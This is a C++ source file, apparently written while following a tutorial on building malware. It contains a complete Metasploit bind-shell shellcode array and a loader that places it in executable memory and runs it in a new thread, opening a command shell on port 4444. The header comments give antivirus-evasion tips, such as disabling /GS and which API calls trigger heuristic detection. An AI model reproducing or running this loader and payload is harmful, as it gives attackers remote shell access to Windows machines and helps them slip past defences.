// mal_c++_01.cpp : This file contains the 'main' function. Program execution begins and ends there.
// https://medium.com/@itzsanskarr/0x01-building-malware-in-c-memory-execution-shellcode-and-av-evasion-basics-2044552ec6db
/* Heuristic Analysis
VirtualAlloc (memory allocation with execute permission)
CreateRemoteThread
LoadLibrary and GetProcAddress (dynamic API resolution) can trigger a detection.

Turn off /GS (buffer security checks) and enable /NODEFAULTLIB if needed later for anti-analysis.
# /NODEFAULTLIB not work, Fan

msfvenom -p windows/shell_bind_tcp LPORT=4444 -f c
-p windows/shell_bind_tcp: This payload listens on port 4444 and provides a shell once connected.
LPORT=4444: Port to listen on.
-f c: Output format for C-style byte array.
*/


#include <Windows.h>

int main() {
    unsigned char buf[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"
"\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
"\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68"
"\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6"
"\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"
"\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57"
"\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89"
"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7"
"\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50"
"\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d"
"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff"
"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"
"\x6f\x6a\x00\x53\xff\xd5"
};

    // Allocate memory with execution permissions
    // Allocates memory at runtime.
    // MEM_COMMIT | MEM_RESERVE: Reserve and commit the memory in one call.
    // PAGE_EXECUTE_READWRITE : Critical.
    // This sets the memory region as readable, writable, and executable.
    // This is the most suspicious line in terms of heuristic detection. 
    // Allocating RWX memory is a strong signal of shellcode execution.
    PVOID exec_mem = VirtualAlloc(
        0,
        sizeof(buf),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (exec_mem == NULL) return 1;

    // Copy the shellcode into the allocated memory
    RtlCopyMemory(exec_mem, buf, sizeof(buf));

    // Create a new thread to run the shellcode
    DWORD threadID;
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)exec_mem,
        NULL,
        0,
        &threadID
    );

    if (hThread == NULL) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    // Wait for the thread to finish executing
    WaitForSingleObject(hThread, INFINITE);
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}

// Process Hacker: Watch for thread creation and memory allocations.
// Procmon: Observe API calls and behavior.
// 
// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
